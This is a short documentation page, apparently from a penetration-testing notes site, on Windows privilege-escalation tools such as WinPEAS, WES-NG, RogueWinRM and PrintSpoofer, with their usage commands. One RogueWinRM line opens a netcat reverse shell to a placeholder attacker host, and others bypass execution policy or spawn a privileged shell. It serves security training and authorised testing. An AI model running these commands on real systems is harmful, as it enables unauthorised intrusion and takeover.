---
sidebar_position: 3
---

# Tools

:::caution This Section is a Work In Progress

:::

## AccessChk

- **List Access of (Users - Groups) to files - Directories - Registry Keys - Global Objects - Windows Services**

```batch
accesschk.exe /accepteula
accesschk64.exe -qlc <ServiceName>
```

## PrivescCheck

- **`PrivescCheck`** is a PowerShell Script that searches common Privilege Escalation on the target System

```powershell
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

## WinPEAS

- <a class="button button--outline button--info" href="https://github.com/carlospolop/PEASS-ng">WinPEAS GitHub</a>
- **Enumeration Script** 

```powershell
C:\> winpeas.exe > <Output>
```

<br/>

---

## WES-NG [Windows Exploit Suggester - Next Generation]

- <a class="button button--outline button--info" href="https://github.com/bitsadmin/wesng">WES-NG GitHub</a>
- **Target**

```batch
C:\> systeminfo > <Output>
```

- **Attacker**

```bash
[user@attacker]$ wes.py --update && wes.py <Systeminfo Output>
```


## RogueWinRM

`RogueWinRM` is a **`Local Privilege`** Escalation Exploit that allows to Escalate from a **Service Account** with `SeImpersonatePrivilege` to Local System Account if WinRM Service is not Running **(Default on `Windows 10` but Not on `Windows Server 2019`).**


- <a class="button button--outline button--info" href="https://github.com/antonioCoco/RogueWinRM">RogueWinRM GitHub</a>

```batch
RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe <ATTACKER_IP> <PORT>"
```

## PrintSpoofer

Abusing `SeImpersonatePrivilege`

```batch
PrintSpoofer64.exe -i -c powershell
```